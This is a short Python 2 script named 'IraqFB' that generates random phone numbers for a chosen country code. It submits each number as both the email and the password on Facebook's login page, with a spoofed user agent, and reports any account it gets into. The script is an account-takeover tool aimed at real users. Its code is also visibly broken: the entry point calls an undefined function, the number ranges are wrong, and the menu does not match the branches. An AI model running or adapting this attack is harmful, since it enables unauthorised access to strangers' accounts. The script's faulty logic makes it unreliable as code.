#IraqFB v 1.0.0
from os import system as sy
from random import randint as ran
import sys, mechanize, cookielib, random
Bg = '\x1b[1;32;40m'
W = '\x1b[1;37;40m'
Bc = '\x1b[1;36;40m'
sy('clear')
print '			33'
print '			34'
print '			07'

d = str(0)
pass
pass
pass
pass
pass
pass
pass
pass
pass
pass
pass
pass
i = str(raw_input('eEnter Number >> :'))

def wolf():
    for x in range(300):        
	if i == '33':
	 a = str(ran(33630000000,33630000000))
        else: 
            if i == '213':
                a = str(ran(2130690000000, 2130669999999))
            else:
                if i == '07':
                    a = str(ran(771111111, 779999999))
                else:
                    exit()
        login = 'https://www.facebook.com/login.php?login_attempt=1'
        useragents = [
         ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

        def main():
            br = mechanize.Browser()
            cj = cookielib.LWPCookieJar()
            br.set_handle_robots(False)
            br.set_handle_redirect(True)
            br.set_cookiejar(cj)
            br.set_handle_equiv(True)
            br.set_handle_referer(True)
            br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
            br.addheaders = [('User-agent', random.choice(useragents))]
            site = br.open(login)
            br.select_form(nr=0)
            br.form['email'] = d + a
            br.form['pass'] = d + a
            sub = br.submit()
            log = sub.geturl()
            print Bc + 'please loading ..  ' + d + a
            if log != login and 'login_attempt' not in log:
                print '\x1b[1;31m' +  ' 			found Account (: ' + d + a
            else:
                print '\x1b[1;32m' +  '			Account not found ): '

        main()


if __name__ == '__main__':
    slam()
